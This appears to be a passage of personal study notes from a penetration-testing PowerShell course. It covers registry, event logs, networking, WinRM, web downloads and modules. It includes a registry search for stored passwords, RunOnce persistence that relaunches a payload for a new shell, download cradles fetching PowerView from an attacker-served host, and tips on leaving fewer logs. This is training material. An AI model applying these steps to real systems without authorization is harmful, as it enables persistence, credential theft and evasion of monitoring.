Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property  
# Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
```ps1
REG QUERY HKCU /F "Password" /t REG_SZ /S /K
# /F sets the pattern
# /t sets the value type to search
# /s says to search through all subkeys and values recursively
# /k narrows it down to only searching through Key names
```
- We have landed on a host and can add a new registry key for persistence. We need to set a key named `TestKey` and a value of `C:\Users\htb-student\Downloads\payload.exe` that tells RunOnce to run our payload we leave on the host the next time the user logs in. This will ensure that if the host restarts or we lose access, the next time the user logs in, we will get a new shell.



```ps1
New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey
New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"
Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey
# Get-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey
Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\Users\htb-student\Downloads\payload.exe"
```


### Working with the Windows Event Log


- **Event**: any action or occurrence that can be identified and classified by a system's hardware or software. Events can be generated or triggered through a variety of different ways including some of the following:
  - *User-Generated Events*: Movement of a mouse, typing on a keyboard, other user-controlled peripherals, etc.
  - *Application Generated Events*: Application updates, crashes, memory usage/consumption, etc.
  - *System Generated Events*: System uptime, system updates, driver loading/unloading, user login, etc.
- [event logging](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging): "provides a standard, centralized way for applications (and the operating system) to record important software and hardware events"
  - The Event Log is a required Windows service starting upon system initialization that runs in the context of another executable and not it's own.
  - [events to monitor](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor)
  - [windows security log events](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)


| Log Category      |	Log Description
| ---               | ---
| System Log        |	The system log contains events related to the Windows system and its components. A system-level event could be a service failing at startup.
| Security Log      |	Self-explanatory; these include security-related events such as failed and successful logins, and file creation/deletion. These can be used to detect various types of attacks that we will cover in later modules.
| Application Log   |	This stores events related to any software/application installed on the system. For example, if Slack has trouble starting it will be recorded in this log.
| Setup Log         |	This log holds any events that are generated when the Windows operating system is installed. In a domain environment, events related to Active Directory will be recorded in this log on domain controller hosts.
| Forwarded Events  |	Logs that are forwarded from other hosts within the same network.

| Type of Event	| Event Description
| ---           | ---
| Error         |	Indicates a major problem, such as a service failing to load during startup, has occurred.
| Warning       |	A less significant log but one that may indicate a possible problem in the future. One example is low disk space. A Warning event will be logged to note that a problem may occur down the road. A Warning event is typically when an application can recover from the event without losing functionality or data.
| Information   |	Recorded upon the successful operation of an application, driver, or service, such as when a network driver loads successfully. Typically not every desktop application will log an event each them they start, as this could lead to a considerable amount of extra "noise" in the logs.
| Success Audit |	Recorded when an audited security access attempt is successful, such as when a user logs on to a system.
| Failure Audit |	Recorded when an audited security access attempt fails, such as when a user attempts to log in but types their password in wrong. Many audit failure events could indicate an attack, such as Password Spraying.


- The Windows Event Log is handled by the `EventLog` services. On a Windows system, the service's display name is **Windows Event Log**, and it runs inside the service host process `svchost.exe`. It is set to start automatically at system boot by default. It is difficult to stop the EventLog service as it has multiple dependency services. If it is stopped, it will likely cause significant system instability. By default, Windows Event Logs are stored in `C:\Windows\System32\winevt\logs` with the file extension `.evtx`.
- 


```ps1
Get-ChildItem $env:WINDIR\System32\winevt\logs

wevtutil el
wevtutil gl "Windows PowerShell"
wevtutil gli "Windows PowerShell"
wevtutil qe Security /c:5 /rd:true /f:text    # Display the last 5 most recent events from the Security log in text format. Local admin access is needed for this command.
wevtutil epl System C:\system_export.evtx     # export events from a specific log for offline processing. Local admin is also needed to perform this export.
```
```ps1
Get-WinEvent -ListLog *
Get-WinEvent -ListLog Security
Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
# Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
# Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message
```

- PRACTICE
  - [Get-WinEvent](https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/)
  - [WevtUtil](https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it)

### Networking Management from the CLI

- Standard protocols


| Protocol        |	Description
| ---             | ---
| **SMB**         |	SMB provides Windows hosts with the capability to *share resources, files, and a standard way of authenticating* between hosts to determine if access to resources is allowed. For other distros, SAMBA is the open-source option.
| **Netbios**     |	NetBios itself isn't directly a service or protocol but a connection and conversation mechanism widely used in networks. It was the original transport mechanism for SMB, but that has since changed. Now it serves as an alternate identification mechanism *when DNS fails*. Can also be known as NBT-NS (NetBIOS name service).
| **LDAP**        |	LDAP is an open-source cross-platform protocol used for *authentication and authorization* with various directory services. This is how many different devices in modern networks can communicate with large directory structure services such as Active Directory.
| **LLMNR**       |	LLMNR provides a name resolution service based on DNS and works *if DNS is not available* or functioning. This protocol is a multicast protocol and, as such, works only on local links ( within a normal broadcast domain, not across layer three links).
| **DNS**         |	DNS is a *common naming standard* used across the Internet and in most modern network types. DNS allows us to reference hosts by a unique name instead of their IP address. This is how we can reference a website by "WWW.google.com" instead of "8.8.8.8". Internally this is how we request resources and access from a network.
| **HTTP/HTTPS**  |	HTTP/S HTTP and HTTPS are the insecure and secure way we request and utilize resources over the Internet. These protocols are used to access and utilize resources such as *web servers*, send and receive data from remote sources, and much more.
| **Kerberos**    |	Kerberos is a *network level authentication* protocol. In modern times, we are most likely to see it when dealing with Active Directory authentication when clients request tickets for authorization to use domain resources.
| **WinRM**       |	WinRM Is an implementation of the WS-Management protocol. It can be used to *manage the hardware and software functionalities* of hosts. It is mainly used in IT administration but can also be used for *host enumeration and as a scripting engine*.
| **RDP**         |	RDP is a Windows implementation of a *network UI services* protocol that provides users with a Graphical interface to access hosts over a network connection. This allows for full UI use to include the passing of keyboard and mouse input to the remote host.
| **SSH**         |	SSH is a secure protocol that can be used for *secure host access, transfer of files, and general communication* between network hosts. It provides a way to securely access hosts and services over insecure networks.

```ps1
ipconfig
ipconfig /all

arp -a

nslookup <foo>    # TODO

netstat -an
```

- Net Cmdlets

| Cmdlet                |	Description
| ---                   | ---
| `Get-NetIPInterface`  |	Retrieve all visible network adapter properties.
| `Get-NetIPAddress`    |	Retrieves the IP configurations of each adapter. Similar to IPConfig.
| `Get-NetNeighbor`     |	Retrieves the neighbor entries from the cache. Similar to arp -a.
| `Get-Netroute`        |	Will print the current route table. Similar to IPRoute.
| `Set-NetAdapter`      |	Set basic adapter properties at the Layer-2 level such as VLAN id, description, and MAC-Address.
| `Set-NetIPInterface`  |	Modifies the settings of an interface to include DHCP status, MTU, and other metrics.
| `New-NetIPAddress`    |	Creates and configures an IP address.
| `Set-NetIPAddress`    |	Modifies the configuration of a network adapter.
| `Disable-NetAdapter`  |	Used to disable network adapter interfaces.
| `Enable-NetAdapter`   |	Used to turn network adapters back on and allow network connections.
| `Restart-NetAdapter`  |	Used to restart an adapter. It can be useful to help push changes made to adapter settings.
| `Test-NetConnection`  |	Allows for diagnostic checks to be ran on a connection. It supports ping, tcp, route tracing, and [more](https://learn.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps).

```ps1
Get-NetAdapter; Get-NetIPInterface
Get-NetIPAddress -ifIndex 13  # Ethernet, Wi-Fi...

Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled
Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24
  Get-NetIPAddress -ifindex 20 | ft InterfaceIndex,InterfaceAlias,IPAddress,PrefixLength
  Get-NetIPinterface -ifindex 20 | ft ifIndex,InterfaceAlias,Dhcp
Restart-NetAdapter -Name 'Ethernet 3'
Test-NetConnection
```

- **SSH**

```ps1
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

Start-Service sshd
  # Set-Service -Name sshd -StartupType 'Automatic'
```
```ps1
ssh user@ip
powershell || pwsh
```

- **WinRM** (ports == 5985 5986)

```ps1
winrm quickconfig
  # TWEAKS: TrustedHosts, AD, Kerberos

Test-WSMan -ComputerName "IP"
Test-WSMan -ComputerName "IP" -Authentication Negotiate

Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate
```

### Interacting with the Web

- [Invoke-WebRequest](https://learn.microsoft.com/bs-latn-ba/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1)
  - basic HTTP/HTTPS requests (like GET and POST), parse through HTML pages, download files, authenticate, and even maintain a session with a site
  - aliases: `wget` `iwr` `curl`

```ps1
Get-Help Invoke-WebRequest

# GET
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent

# DOWNLOADING
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
python3 -m http.server 8000
Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

- [.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0)
  - This handy class is a .Net call we can utilize as Windows uses and understands .Net. This class contains standard system.net methods for interacting with resources via a URI (web addresses like github.com/project/tool.ps1).

```ps1
(New-Object Net.WebClient).DownloadFile("https://github.com/SpecterOps/BloodHound/archive/refs/tags/v5.0.10.zip", "Bloodhound.zip")
  # First we have the Download cradle (New-Object Net.WebClient).DownloadFile(), which is how we tell it to execute our request.
  # Next, we need to include the URI of the file we want to download as the first parameter in the (). For this example, that was "https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip".
  # Finally, we need to tell the command where we want the file written to with the second parameter , "BloodHound.zip".

# From here, we can extract the tools and run them as we see fit.
# Keep in mind this is noisy because you will have web requests entering and leaving your network along with file reads and writes, so it WILL leave logs. If your transfers are done locally, only host to host, for example, you only leave logs on those hosts, which are a bit harder to sift through and leave less of a trace since we aren't writing ingress/egress logs at the customer boundary.
```

### PowerShell Scripting and Automation

> https://github.com/pabloqpacin/dotfiles

- The traditional thought when dealing with scripting is that we are writing some form of an executable that performs tasks for us in the language it was created. With PowerShell, this is still true, with the exception that it can handle input from several different languages and file types and can handle many different object types. We can utilize singular scripts in the usual manner by calling them utilizing .\script syntax and importing modules using the Import-Module cmdlet.
- **Scripts VS Modules**
  - [ ] [Writing a Windows PowerShell Module](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/writing-a-windows-powershell-module?view=powershell-7.2)
  - The easiest way to think of it is that a script is an executable text file containing PowerShell cmdlets and functions, while a module can be just a simple script, or a collection of multiple script files, manifests, and functions bundled together. The other main difference is in their use.
  - You would typically call a script by executing it directly, while you can import a module and all of the associated scripts and functions to call at your whim. For the sake of this section, we will discuss them using the same term, and everything we talk about in a module file works in a standard PowerShell script. First up is file extensions and what they mean to us.
  - [ ] [Writing Help for PowerShell Scripts and Functions](https://learn.microsoft.com/en-us/powershell/scripting/developer/help/writing-help-for-windows-powershell-scripts-and-functions?view=powershell-7.2)
  - [ ] [Comment-Based Help Keywords](https://learn.microsoft.com/en-us/powershell/scripting/developer/help/comment-based-help-keywords?view=powershell-7.2)

| Extension |	Description
| ---       | ---
| ps1       |	The `*.ps1` file extension represents executable PowerShell scripts.
| psm1      |	The `*.psm1` file extension represents a PowerShell module file. It defines what the module is and what is contained within it.
| psd1      |	The `*.psd1` is a PowerShell data file detailing the contents of a PowerShell module in a table of key/value pairs.

#### PWSH Modules

```md
A module is made up of four essential components:
1. A directory containing all the required files and content, saved somewhere within $env:PSModulePath.
  - This is done so that when you attempt to import it into your PowerShell session or Profile, it can be automatically found instead of having to specify where it is.
2. A manifest file listing all files and pertinent information about the module and its function.
  - This could include associated scripts, dependencies, the author, example usage, etc.
3. Some code file - usually either a PowerShell script (.ps1) or a (.psm1) module file that contains our script functions and other information.
4. Other resources the module needs, such as help files, scripts, and other supporting documents.
```

- Manifest.psd1

```md
A module manifest is a simple .psd1 file that contains a hash table. The keys and values in the hash table perform the following functions:
- Describe the contents and attributes of the module.
- Define the prerequisites. ( specific modules from outside the module itself, variables, functions, etc.)
- Determine how the components are processed.

If you add a manifest file to the module folder, you can reference multiple files as a single unit by referencing the manifest. The manifest describes the following information:
- Metadata about the module, such as the module version number, the author, and the description.
- Prerequisites needed to import the module, such as the Windows PowerShell version, the common language runtime (CLR) version, and the required modules.
- Processing directives, such as the scripts, formats, and types to process.
- Restrictions on the module members to export, such as the aliases, functions, variables, and cmdlets to export.
```


```ps1
# symlink ~\dotfiles\windows\Modules\foo ~\Documents\PowerShell\Modules\foo
mkdir $env:HOMEPATH\Documents\PowerShell\Modules  # $ModulesPath

# 1. Manifest
New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru

# 2. Script
New-Item quick-recon.psm1 -ItemType File

  Import-Module ActiveDirectory
  # ...

# .. Import
Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon.psm1'
Get-Module; Get-Help Get-Recon

```

- Scope
  - [ ] [about_Scopes](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scopes?view=powershell-7.2)
  - When dealing with scripts, the PowerShell session, and how stuff is recognized at the Commandline, the concept of Scope comes into play. Scope, in essence, is how PowerShell recognizes and protects objects within the session from unauthorized access or modification. PowerShell currently uses three different Scope levels:



| Scope   |	Description
| ---     | ---
| Global  |	This is the default scope level for PowerShell. It affects all objects that exist when PowerShell starts, or a new session is opened. Any variables, aliases, functions, and anything you specify in your PowerShell profile will be created in the Global scope.
| Local   |	This is the current scope you are operating in. This could be any of the default scopes or child scopes that are made.
| Script  |	This is a temporary scope that applies to any scripts being run. It only applies to the script and its contents. Other scripts and anything outside of it will not know it exists. To the script, Its scope is the local scope.

## Finish Strong
### ~~Skills Assessment~~
### Beyond this Module

- [DEF CON Safe Mode Red Team Village - Anthony Rose, Jake Krasnov - APTs ❤️PowerShell You Should Too](https://www.youtube.com/watch?v=GhfiNTsxqxA)
- [POWERSHELL & UNDERTHEWIRE w/ SinisterMatrix](https://www.youtube.com/watch?v=864S16g_SQs)
- [KringleCon - Mick Douglas, PowerShell for Pen Testing](https://www.youtube.com/watch?v=jU1Pz641zjM)